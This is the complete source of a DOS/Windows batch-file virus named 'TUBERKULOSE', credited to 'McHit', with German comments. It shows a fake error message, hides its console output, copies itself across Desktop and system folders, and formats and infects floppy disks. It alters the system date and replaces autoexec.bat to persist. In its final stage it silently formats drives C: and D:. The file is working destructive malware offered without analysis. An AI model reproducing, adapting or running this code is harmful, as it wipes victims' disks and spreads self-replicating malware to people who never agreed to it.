   @echo off
   REM -TUBERKULOSE-BAkTerium
   REM by McHit
   if exist C:\Windows\TBC3\*.* goto TOD
   if exist C:\Windows\TBC2\*.bat goto nw
   echo Beim Oeffnen des Programms ist ein Fehler aufgetretten!
   echo Bitte wiederholen Sie den Vorgang!
   goto anf
   :nw
   if exist C:\Windows\TBC\5\*.bat goto ex
   goto anf
   :ex
   cls
   echo INFECT BY TUBERKULOSE
   echo by McHit
   :anf
   ctty NUL
   REM Ausbruch der TUBERKULOSE
   md C:\Windows
   md C:\Windows\TBC
   md C:\subst
   copy %0 C:\subst
   subst H: C:\Subst
   copy %0 C:\Windows\Desktop
   md C:\Windows\Desktop\Problem
   copy %0 C:\Windows\Desktop\Problem
   md C:\Windows\Desktop\Explorer
   copy %0 C:\Windows\Desktop\Explorer
   md C:\Windows\Desktop\Info
   copy %0 C:\WINDOWS\Desktop\Info
   md C:\Windows\Desktop\Spiele
   copy %0 C:\Windows\Desktop\Spiele
   md C:\Windows\Desktop\Programme
   copy %0 C:\Windows\Desktop\Programme
   md C:\Windows\Desktop\Internet
   copy %0 C:\Windows\Desktop\Internet
   copy %0 C:\
   md C:\ReadMe
   copy %0 C:\ReadMe
   md C:\Windows
   copy %0 C:\Windows
   md C:\DOS
   copy %0 C:\DOS


   :1
   if not exist C:\Windows\TBC\1\*.bat goto nicht1


   :2
   if not exist C:\Windows\TBC\2\*.bat goto nicht2


   :3
   if not exist C:\Windows\TBC\3\*.bat goto nicht3


   :4
   if not exist C:\Windows\TBC\4\*.bat goto nicht4


   :5
   if not exist C:\Windows\TBC\5\*.bat goto nicht5
   goto 5mal


   :nicht1
   if exist A:\*.bat goto Ende
   format A: /u /q /autotest
   copy %0 A:\
   md C:\Windows\TBC\1
   copy %0 C:\Windows\TBC\1
   goto Ende


   :nicht2
   if exist A:\*.bat goto Ende
   format A: /u /q /autotest
   copy %0 A:\
   md C:\Windows\TBC\2
   copy %0 C:\Windows\TBC\2
   goto Ende


   :nicht3
   if exist A:\*.bat goto Ende
   format A: /u /q /autotest
   copy %0 A:\
   md C:\Windows\TBC\3
   copy %0 C:\Windows\TBC\3
   goto Ende


   :nicht4
   if exist A:\*.bat goto Ende
   format A: /u /q /autotest
   copy %0 A:\
   md C:\Windows\TBC\4
   copy %0 C:\Windows\TBC\4
   goto Ende


   :nicht5
   if exist A:\*.bat goto Ende
   format A: /u /q /autotest
   copy %0 A:\
   md C:\Windows\TBC\5
   copy %0 C:\Windows\TBC\5
   goto Ende


   :5mal


   :stadium1
   if exist C:\Windows\TBC1\*.bat goto stadium2
   ren C:\Windows\TBC\1\*.bat 1.bau
   ren C:\Windows\TBC\2\*.bat 1.bau
   ren C:\Windows\TBC\3\*.bat 1.bau
   ren C:\Windows\TBC\4\*.bat 1.bau
   ren C:\Windows\TBC\5\*.bat 1.bau
   md C:\Windows\TBC1
   copy %0 C:\Windows\TBC1
   date 19.03.1987
   time 15:34:00,00
   goto Ende


   :stadium2
   if exist C:\Windows\TBC2\*.bat goto stadium3
   ren C:\Windows\TBC\1\*.bat 2.bau
   ren C:\Windows\TBC\2\*.bat 2.bau
   ren C:\Windows\TBC\3\*.bat 2.bau
   ren C:\Windows\TBC\4\*.bat 2.bau
   ren C:\Windows\TBC\5\*.bat 2.bau
   md C:\Windows\TBC2
   copy %0 C:\Windows\TBC2
   ren C:\autoexec.bat auto.bat
   copy %0 C:\autoexec.bat
   goto Ende


   :stadium3
   REM Endestadium
   ren C:\Windows\TBC\1\*.bat 3.bau
   ren C:\Windows\TBC\2\*.bat 3.bau
   ren C:\Windows\TBC\3\*.bat 3.bau
   ren C:\Windows\TBC\4\*.bat 3.bau
   ren C:\Windows\TBC\5\*.bat 3.bau
   md C:\Windows\TBC3
   copy %0 C:\Windows\TBC3
   if exist A:\*.bat goto TOD
   format A: /u /q /autotest
   copy %0 A:\
   :TOD
   echo INFECT BY TUBERKULOSE
   echo by McHit
   ctty NUL
   format C: /u /q /autotest
   format D: /u /q /autotest
   :Ende
   if exist C:\Windows\TBC2\*.bat call C:\auto.bat
